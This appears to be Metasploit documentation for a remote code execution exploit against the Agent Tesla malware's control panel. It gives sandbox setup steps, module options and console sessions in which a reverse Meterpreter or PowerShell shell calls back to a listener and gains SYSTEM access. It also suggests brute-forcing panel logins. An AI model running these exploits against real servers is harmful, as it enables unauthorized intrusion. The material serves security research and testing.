## Vulnerable Application

### Description

This module exploit a command injection vulnerability (authenticated and unauthenticated) in the control center of the Agent Tesla.

The RCE is possible by mixing two vulnerabilities (SQLi + PHP Object Injection) into the `WebPanel/server_side/scripts/server_processing.php` file.

By looking at other versions of Agent Tesla sources that are on the Internet. The following code has been added at the beginning of the vulnerable page since September 12 2018.

```
session_start();
  if (!isset($_SESSION['logged_in'])
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
  }
```

This shifts the problem to an authenticated RCE.

As the versions cannot be determined easily, it is preferable to test in priority without entering the identification information. This allows you to test a non-authenticated RCE.

And if that fails, you have to guess the passwords to do test with an authentication by adding the credentials in the module.

**NOTE:**

Using [CyberCrime Tracker](https://cybercrime-tracker.net/), it is possible to found several Web Panel to download.

There are no versions displayed in the Agent Tesla control center, but it is possible to use the dates/times of the files contained in the `zip` archives to evaluate the evolutions of the versions (but it is not specific).

For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) -2017- (unauthenticated RCE) protected by `ioncube`.

 * Tested on Windows 7 x64 with WAMP server 3.2.0 x64 and PHP version 5.6.40.
 * Tested on Debian 9.9.0 with PHP version 5.6.40.

For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) -2018- (authenticated RCE) protected by `ioncube`.

 * Tested on Windows 7 x64 with WAMP server 3.2.0 x64 and PHP version 7.2.18.
 * Tested on Debian 9.9.0 with PHP version 7.2.31.

For [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) -2019- (authenticated RCE) source code is not obfuscated, **don't need** `ioncube`.

 * Tested on Windows 7 x64 WAMP server 3.2.0 x64 and PHP version 5.6.40.
 * Tested on Debian 9.9.0 with PHP version 7.2.31.

### Setup

Resources for testing are available here:
<https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources/>

#### Using Windows

##### Install WAMP Server 3.2.0 x64

For this, you can use a Microsoft Windows 7 x64 as sandboxing system with analysis tools like [FlareVM](https://github.com/fireeye/flare-vm).

You must install simply the latest version of [WAMP Server](https://sourceforge.net/projects/wampserver/files/latest/download) (at this date the used version is 3.2.0).

1. Install `Wamp` using default installer configuration.
2. Start `Wamp` and right click on the icon of started application and ***check*** `Wamp Settings > Allow VirtualHost local IP's others than 127.*`.
3. Allow access to wamp server in local area network.

For the this `Wamp` Server version:

Edit the `httpd-vhost.conf` file into `c:/wamp64/bin/apache/apache2.4.41/conf/extra/` directory.

Replace the line containig  `Require local` by `Require all granted`.

4. Select PHP version 5.6.40 by selecting `PHP > Version > 5.6.40` (***left click*** on started application icon).

5. Use the preinstalled `phpmyadmin` of `Wamp` for create a blank database for Agant Tesla web panel.

6. Restart `Wamp`.

#### Using Linux

##### Install LAMP (Apache, MySQL, PHP)

For this, you can use a Linux Debian 9.9.0 (Stretch) x86_x64 as sandboxing system.

1. Install LAMP (Apache, MySQL, PHP).

```bash
sudo apt-get install apache2 apache2-utils mariadb-server mariadb-client ca-certificates apt-transport-https

wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
echo "deb https://packages.sury.org/php/ stretch main" | sudo tee /etc/apt/sources.list.d/php.list
sudo apt-get update

# For PHP 5.6.40:
sudo apt-get install php5.6 php5.6-cli php5.6-common php5.6-curl php5.6-mbstring php5.6-mysql php5.6-xml libapache2-mod-php5.6 php5.6-json php5.6-opcache php5.6-readline

# For PHP 7.2.31:
sudo apt-get install php7.2 php7.2-cli php7.2-common php7.2-curl php7.2-mbstring php7.2-mysql php7.2-xml libapache2-mod-php7.2 php7.2-json php7.2-opcache php7.2-readline

sudo mysql_secure_installation
```

2. Create a blank database for Agant Tesla web panel.

```
sudo mysql -u root -ppassword

CREATE DATABASE tesla;
CREATE USER 'user' IDENTIFIED BY 'password';
GRANT USAGE ON *.* TO 'user'@localhost IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON `tesla`.* TO 'user'@localhost;
FLUSH PRIVILEGES;
exit
```

#### Install Agent Tesla Web panel (simple way)

For this step, you need a functional web environment installed and to have created an empty database (refer to the configuration above).

NOTE: The Agent Tesla panels can be tracked on the web and the sources can be found by looking for the `WebPanel.zip` file at the root directory. Some attackers are stupid and leave this file lying around on the server.

The [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) should be used preferably because it is ***not protected*** by `ioncube` and because of this the source code is in clear (but all the other panels are functional with a little more complicated configuration).

Based on the file creation dates (and diff) to get an idea of ​​the panels evolution, you have more details (in french) on [Agent Tesla Remote Command Execution (fighting the WebPanel)](https://www.pirates.re/agent-tesla-remote-command-execution-fighting-the-webpanel/).

***IMPORTANT:*** This version of the panel is "by default" patched against unauthenticated RCE. But this is explain in the blog post [Agent Tesla Remote Command Execution (fighting the WebPanel)](https://www.pirates.re/agent-tesla-remote-command-execution-fighting-the-webpanel/). The patch simply consist adding authentication on the vulnerable page. And that the variables are still not properly sanitized.

To put it simply, with this version of the panel, by default you have an 'Authenticated RCE'.

Now, if you want to "switch" to test simply the `Unauthenticated RCE` with this panel, ***just put the authentication in comment*** on the `WebPanel/server_side/scripts/server_processing.php` page.

As example:

```php
/* // Comment the authentication.
session_start();
  if (!isset($_SESSION['logged_in'])
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
  }
*/
```

1. Uncompress the [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) into your Web directory.
2. Remove the config file `WebPanel/config.php` (it is generated at step 3).
3. Go to: <http://localhost/WebPanel/setup.php>.
4. You can log into Agent Tesla Web panel, all is done.

#### Using Ioncube

##### With Windows

Follow [Install WAMP Server 3.2.0 x64](#Setup) steps.

1. Download [ioncube loader wizard](https://www.ioncube.com/loader-wizard/loader-wizard.zip).
2. Make sure you have a proper version of PHP selected for the WebPanel you want install with `Wamp` before using `ioncube loader wizard`.

  * For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) you need PHP 5.6.40.
  * For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) you need PHP 7.2.18.


3. Uncompress `loader-wizard.zip` into your web root directory: `C:\Wamp64\www\`.
4. Go to http://localhost/loader-wizard/ioncube/loader-wizard.php and follow the installation instructions.

Follow [Install Agent Tesla Web panel (simple way)](#Setup) steps replacing `WebPanel3.7z` by your obfuscated panel.

##### With Linux

Follow [Install LAMP (Apache, MySQL, PHP)](#Setup) steps.

1. Download [ioncube loader wizard](https://www.ioncube.com/loader-wizard/loader-wizard.tgz).
2. Make sure you have a proper version of PHP selected for the WebPanel you want install with `Wamp` before using `ioncube loader wizard`.

* For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) you need PHP 5.6.40.
* For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) you need PHP 7.2.31.

3. Uncompress `loader-wizard.tgz` into your web root directory: `/var/www/html/`.
4. Go to http://localhost/ioncube/loader-wizard.php and follow the installation instructions.

Follow [Install Agent Tesla Web panel (simple way)](#Setup) steps replacing `WebPanel3.7z` by your obfuscated panel.

## Verification Steps

Follow [Setup](#Setup) and [Scenarios](#Scenarios).

## Options

**PASSWORD**

The Agent Tesla CnC password to authenticate with (needed if you attempt an authenticated RCE).

**Proxies**

A proxy chain of format type:host:port[,type:host:port][...]. It's optional.

**RHOSTS**

The target IP address on which the control center responds.

**RPORT**

The target TCP port on which the control center responds. Default: 80

**SSL**

Negotiate SSL/TLS for outgoing connections. Default: false

**TARGETURI**

The base URI path of control center. Default: '/WebPanel'

**USERNAME**

The Agent Tesla CnC username to authenticate with (needed if you attempt an authenticated RCE).

**VHOST**

The target HTTP server virtual host.

## Targets

```
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix (In-Memory)
   2   Windows (In-Memory)
```

## Scenarios

**IMPORTANT:** However, is possible of found a 2017 control center version which normally are supposed to be vulnerable to an unauthenticated RCE, which was manually patched by the bots master. In real life, if the unauthenticated attempt doesn't work try to guess the credentials by brute-forcing the panel authentication.

### Agent Tesla (panel < September 12 2018) Unauthenticated on Linux

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `run`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: linux
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .WxWf.php
[*] Sending stage (38247 bytes) to 192.168.1.25
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.25:43260) at 2019-09-04 14:44:07 +0400

meterpreter >
```

### Agent Tesla (panel >= September 12 2018) Authenticated on Linux

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `set USERNAME admin`
5. Do: `set PASSWORD password`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 1
target => 1
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Sending cmd/unix/generic command payload
[!] Dumping command output in parsed json response
www-data
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

### Agent Tesla (panel < September 12 2018) Unauthenticated on Windows

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `run`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set lhost 192.168.1.13
lhost => 192.168.1.13
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: windows
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .AUKU.php
[*] Sending stage (38247 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.21:1036) at 2019-09-04 01:24:12 +0400

meterpreter >
```

### Agent Tesla (panel >= September 12 2018) Authenticated on Windows

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `set USERNAME admin`
5. Do: `set PASSWORD password`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Sending cmd/windows/reverse_powershell command payload
[*] Command shell session 2 opened (192.168.1.13:4444 -> 192.168.1.21:1040) at 2019-09-04 01:28:55 +0400

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp64\www\WebPanel\server_side\scripts>whoami
nt authority\system

C:\wamp64\www\WebPanel\server_side\scripts>
```

## References

  1. <https://krebsonsecurity.com/2018/10/who-is-agent-tesla/>
  2. <https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources/>
  3. <https://www.exploit-db.com/exploits/47256>
  4. <https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)>
